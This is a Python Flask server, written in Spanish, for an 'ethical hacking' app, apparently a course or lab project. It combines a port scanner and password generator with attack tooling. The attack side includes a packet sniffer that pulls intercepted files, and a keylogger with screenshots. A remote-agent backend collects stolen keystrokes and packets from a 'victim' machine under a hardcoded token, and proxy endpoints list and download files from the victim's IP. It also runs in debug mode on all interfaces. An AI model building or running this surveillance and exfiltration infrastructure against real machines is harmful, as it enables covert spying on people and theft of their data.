"""
Aplicación de Hacking Ético - Ciberseguridad
Servidor Flask principal con endpoints para escaneo de puertos, generación de contraseñas, sniffing y keylogger.
"""

from flask import Flask, render_template, request, jsonify, send_file, send_from_directory
import io
import os
import json
from datetime import datetime
from scanner import scan_single_port, scan_port_range, scan_all_ports
from password_generator import generate_passwords
from sniffer import sniffer
from keylogger import keylogger

app = Flask(__name__)

# ── Carpeta de uploads de arch.py (máquina víctima) ───────────────────────────
BASE_DIR = os.path.abspath(os.path.dirname(__file__))
UPLOADS_FOLDER = os.path.join(BASE_DIR, 'uploads')
os.makedirs(UPLOADS_FOLDER, exist_ok=True)

# ── Token de seguridad compartido con remote_agent.py ────────────────────────
AGENT_TOKEN = 'CIBER2026'


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/scan', methods=['POST'])
def scan():
    data = request.get_json()
    if not data:
        return jsonify({'success': False, 'error': 'No se recibieron datos.'}), 400

    host = data.get('host', '').strip()
    scan_type = data.get('scan_type', '')

    if not host:
        return jsonify({'success': False, 'error': 'Debe indicar una dirección IP o hostname.'}), 400

    try:
        if scan_type == 'single':
            port = data.get('port')
            if not port:
                return jsonify({'success': False, 'error': 'Debe indicar un número de puerto.'}), 400
            port = int(port)
            if port < 1 or port > 65535:
                return jsonify({'success': False, 'error': 'El puerto debe estar entre 1 y 65535.'}), 400
            result = scan_single_port(host, port)

        elif scan_type == 'range':
            start_port = data.get('start_port')
            end_port = data.get('end_port')
            if not start_port or not end_port:
                return jsonify({'success': False, 'error': 'Debe indicar el rango de puertos.'}), 400
            start_port, end_port = int(start_port), int(end_port)
            if start_port < 1 or end_port > 65535 or start_port > end_port:
                return jsonify({'success': False, 'error': 'Rango de puertos inválido (1-65535).'}), 400
            result = scan_port_range(host, start_port, end_port)

        elif scan_type == 'all':
            result = scan_all_ports(host)

        else:
            return jsonify({'success': False, 'error': 'Tipo de escaneo no válido.'}), 400

        return jsonify(result)

    except ValueError:
        return jsonify({'success': False, 'error': 'Los puertos deben ser números enteros.'}), 400
    except Exception as e:
        return jsonify({'success': False, 'error': f'Error inesperado: {str(e)}'}), 500


@app.route('/generate-passwords', methods=['POST'])
def gen_passwords():
    data = request.get_json()
    if not data:
        return jsonify({'success': False, 'error': 'No se recibieron datos.'}), 400
    try:
        length = int(data.get('length', 0))
        count = int(data.get('count', 0))
    except (ValueError, TypeError):
        return jsonify({'success': False, 'error': 'La longitud y cantidad deben ser números enteros.'}), 400
    return jsonify(generate_passwords(length, count))


@app.route('/sniff', methods=['POST'])
def sniff_network():
    data = request.get_json()
    if not data:
        return jsonify({'success': False, 'error': 'No se recibieron datos.'}), 400
    try:
        count = int(data.get('count', 50))
        filter_protocol = data.get('filter', 'all')
        interface = data.get('interface', None)

        if filter_protocol not in ['all', 'tcp', 'udp', 'icmp']:
            return jsonify({'success': False, 'error': 'Filtro no válido. Use: all, tcp, udp, icmp'}), 400

        result = sniffer.start_capture(
            count=count,
            filter_protocol=filter_protocol,
            interface=interface if interface else None
        )
        return jsonify(result)

    except ValueError:
        return jsonify({'success': False, 'error': 'La cantidad debe ser un número entero.'}), 400
    except Exception as e:
        return jsonify({'success': False, 'error': f'Error inesperado: {str(e)}'}), 500


@app.route('/save-capture', methods=['POST'])
def save_capture():
    data = request.get_json()
    if not data:
        return jsonify({'success': False, 'error': 'No se recibieron datos.'}), 400

    filepath = data.get('filepath', '').strip()
    packets = data.get('packets', [])

    if not filepath:
        return jsonify({'success': False, 'error': 'Debe indicar la ruta del archivo.'}), 400
    if not packets:
        return jsonify({'success': False, 'error': 'No hay paquetes para guardar.'}), 400
    if not filepath.endswith('.json'):
        filepath += '.json'

    return jsonify(sniffer.save_capture(filepath, packets))


@app.route('/download-capture', methods=['POST'])
def download_capture():
    """
    Genera el JSON de captura en memoria y lo devuelve como descarga al navegador.
    No escribe nada en disco del servidor.
    """
    data = request.get_json()
    if not data:
        return jsonify({'success': False, 'error': 'No se recibieron datos.'}), 400

    packets = data.get('packets', [])
    if not packets:
        return jsonify({'success': False, 'error': 'No hay paquetes para descargar.'}), 400

    json_str = sniffer.get_capture_json(packets)
    filename = f'captura_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'

    return send_file(
        io.BytesIO(json_str.encode('utf-8')),
        mimetype='application/json',
        as_attachment=True,
        download_name=filename
    )


# ── NUEVO: Descarga de archivos interceptados ─────────────────────────────────

@app.route('/download-intercepted/<int:file_index>', methods=['GET'])
def download_intercepted(file_index):
    """
    Descarga un archivo interceptado durante el sniffing HTTP.
    file_index: posición del archivo en la lista intercepted_files.
    """
    file_bytes = sniffer.get_intercepted_file_bytes(file_index)
    file_info = sniffer.get_intercepted_file_info(file_index)

    if file_bytes is None or file_info is None:
        return jsonify({'success': False, 'error': 'Archivo no encontrado.'}), 404

    return send_file(
        io.BytesIO(file_bytes),
        mimetype=file_info.get('content_type', 'application/octet-stream'),
        as_attachment=True,
        download_name=file_info['filename']
    )


# ── Keylogger ─────────────────────────────────────────────────────────────────

@app.route('/keylogger-start', methods=['POST'])
def keylogger_start():
    data = request.get_json()
    if not data:
        return jsonify({'success': False, 'error': 'No se recibieron datos.'}), 400
    try:
        duration = int(data.get('duration', 10))
        screenshot_interval = int(data.get('screenshot_interval', 5))
        if duration < 1 or duration > 30:
            return jsonify({'success': False, 'error': 'La duración debe ser entre 1 y 30 segundos.'}), 400
        if screenshot_interval < 0:
            screenshot_interval = 0
        return jsonify(keylogger.start(duration=duration, screenshot_interval=screenshot_interval))
    except ValueError:
        return jsonify({'success': False, 'error': 'La duración debe ser un número entero.'}), 400
    except Exception as e:
        return jsonify({'success': False, 'error': f'Error: {str(e)}'}), 500


@app.route('/keylogger-stop', methods=['POST'])
def keylogger_stop():
    return jsonify(keylogger.stop())


@app.route('/save-keylog', methods=['POST'])
def save_keylog():
    data = request.get_json()
    if not data:
        return jsonify({'success': False, 'error': 'No se recibieron datos.'}), 400

    filepath = data.get('filepath', '').strip()
    keys = data.get('keys', [])
    captured_text = data.get('captured_text', '')
    screenshots = data.get('screenshots', [])

    if not filepath:
        return jsonify({'success': False, 'error': 'Debe indicar la ruta del archivo.'}), 400
    if not keys:
        return jsonify({'success': False, 'error': 'No hay teclas para guardar.'}), 400
    if not filepath.endswith('.json'):
        filepath += '.json'

    return jsonify(keylogger.save_log(filepath, keys, captured_text, screenshots=screenshots))


# ── Agente Remoto ─────────────────────────────────────────────────────────────

def _check_token(data: dict) -> bool:
    return data.get('agent_token') == AGENT_TOKEN


@app.route('/agent/register', methods=['POST'])
def agent_register():
    data = request.get_json()
    if not data or not _check_token(data):
        return jsonify({'success': False, 'error': 'Token inválido o no autorizado.'}), 403

    mode = data.get('mode')
    agent_info = {
        'agent_ip': data.get('agent_ip', 'desconocida'),
        'mode': mode,
        'registered_at': __import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'count': data.get('count'),
        'duration': data.get('duration'),
        'filter': data.get('filter', 'all'),
    }

    if mode == 'sniffer':
        result = sniffer.register_remote_agent(agent_info)
    elif mode == 'keylogger':
        result = keylogger.register_remote_agent(agent_info)
    else:
        return jsonify({'success': False, 'error': 'Modo no válido. Usa: sniffer o keylogger.'}), 400

    print(f"[AGENTE] Registrado: IP={agent_info['agent_ip']} modo={mode}")
    return jsonify(result)


@app.route('/agent/push-packets', methods=['POST'])
def agent_push_packets():
    data = request.get_json()
    if not data or not _check_token(data):
        return jsonify({'success': False, 'error': 'Token inválido.'}), 403

    packets = data.get('packets', [])
    final = data.get('final', False)

    if not isinstance(packets, list):
        return jsonify({'success': False, 'error': 'Formato de paquetes inválido.'}), 400

    return jsonify(sniffer.receive_remote_packets(packets, final=final))


@app.route('/agent/push-keys', methods=['POST'])
def agent_push_keys():
    data = request.get_json()
    if not data or not _check_token(data):
        return jsonify({'success': False, 'error': 'Token inválido.'}), 403

    keys = data.get('keys', [])
    screenshots = data.get('screenshots', [])
    final = data.get('final', False)

    if not isinstance(keys, list):
        return jsonify({'success': False, 'error': 'Formato de teclas inválido.'}), 400

    return jsonify(keylogger.receive_remote_keys(keys, screenshots=screenshots, final=final))


@app.route('/agent/results/sniffer', methods=['GET'])
def agent_results_sniffer():
    return jsonify(sniffer.get_remote_results())


@app.route('/agent/results/keylogger', methods=['GET'])
def agent_results_keylogger():
    return jsonify(keylogger.get_remote_results())


@app.route('/agent/status', methods=['GET'])
def agent_status():
    return jsonify({
        'success': True,
        'sniffer_agent': sniffer._remote_agent_info or None,
        'sniffer_packets': len(sniffer._remote_packets),
        'sniffer_files': len(sniffer._remote_files),
        'sniffer_complete': sniffer._remote_complete,
        'keylogger_agent': keylogger._remote_agent_info or None,
        'keylogger_keys': len(keylogger._remote_keys),
        'keylogger_screenshots': len(keylogger._remote_screenshots),
        'keylogger_complete': keylogger._remote_complete,
    })


# ── Proxy hacia arch.py en la máquina VÍCTIMA ────────────────────────────────
# El atacante escribe la IP de la víctima en su CyberTool.
# app.py hace proxy de las peticiones para evitar bloqueos CORS del navegador.

import requests as _requests  # alias para no pisar el objeto Flask request

ARCH_PORT = 5001
ARCH_TIMEOUT = 6  # segundos


def _victim_base(victim_ip: str) -> str:
    """Construye la URL base del arch.py de la víctima."""
    ip = victim_ip.strip().rstrip('/')
    return f"http://{ip}:{ARCH_PORT}"


@app.route('/arch/proxy/files', methods=['GET'])
def arch_proxy_files():
    """
    Proxy: obtiene la lista de archivos del arch.py de la víctima.
    Parámetro GET: target=<ip_de_la_víctima>
    """
    victim_ip = request.args.get('target', '').strip()
    if not victim_ip:
        return jsonify({'success': False, 'error': 'Parámetro target (IP de la víctima) requerido.'}), 400

    try:
        url = f"{_victim_base(victim_ip)}/api/files"
        resp = _requests.get(url, timeout=ARCH_TIMEOUT)
        data = resp.json()
        # Añadir victim_ip a la respuesta para que el JS sepa a quién pertenece
        data['victim_ip'] = victim_ip
        return jsonify(data)
    except _requests.exceptions.ConnectionError:
        return jsonify({'success': False,
                        'error': f'No se pudo conectar a {victim_ip}:{ARCH_PORT}. '
                                  'Verifica que arch.py esté corriendo en la víctima.'}), 502
    except _requests.exceptions.Timeout:
        return jsonify({'success': False,
                        'error': f'Timeout conectando a {victim_ip}:{ARCH_PORT}.'}), 504
    except Exception as e:
        return jsonify({'success': False, 'error': f'Error: {str(e)}'}), 500


@app.route('/arch/proxy/download', methods=['GET'])
def arch_proxy_download():
    """
    Proxy: descarga un archivo del arch.py de la víctima y lo reenvía al navegador.
    Parámetros GET: target=<ip>, file=<nombre_archivo>
    """
    victim_ip = request.args.get('target', '').strip()
    filename  = request.args.get('file', '').strip()

    if not victim_ip or not filename:
        return jsonify({'success': False, 'error': 'Parámetros target y file requeridos.'}), 400

    # Evitar path traversal
    safe_name = os.path.basename(filename)
    if not safe_name:
        return jsonify({'success': False, 'error': 'Nombre de archivo inválido.'}), 400

    try:
        url = f"{_victim_base(victim_ip)}/api/download/{safe_name}"
        resp = _requests.get(url, timeout=ARCH_TIMEOUT, stream=True)

        if resp.status_code == 404:
            return jsonify({'success': False, 'error': 'Archivo no encontrado en la víctima.'}), 404

        content_type = resp.headers.get('Content-Type', 'application/octet-stream')

        return send_file(
            io.BytesIO(resp.content),
            mimetype=content_type,
            as_attachment=True,
            download_name=safe_name
        )
    except _requests.exceptions.ConnectionError:
        return jsonify({'success': False,
                        'error': f'No se pudo conectar a {victim_ip}:{ARCH_PORT}.'}), 502
    except _requests.exceptions.Timeout:
        return jsonify({'success': False, 'error': 'Timeout descargando el archivo.'}), 504
    except Exception as e:
        return jsonify({'success': False, 'error': f'Error: {str(e)}'}), 500


if __name__ == '__main__':
    print("\n" + "=" * 60)
    print("  🔒 Aplicación de Hacking Ético - Ciberseguridad")
    print("  📡 Scanner | 🔑 Passwords | 🕵️ Sniffer | ⌨️ Keylogger")
    print("=" * 60)
    print("  Servidor corriendo en: http://127.0.0.1:5000")
    print(f"  Token del agente remoto: {AGENT_TOKEN}")
    print("=" * 60 + "\n")
    app.run(debug=True, host='0.0.0.0', port=5000)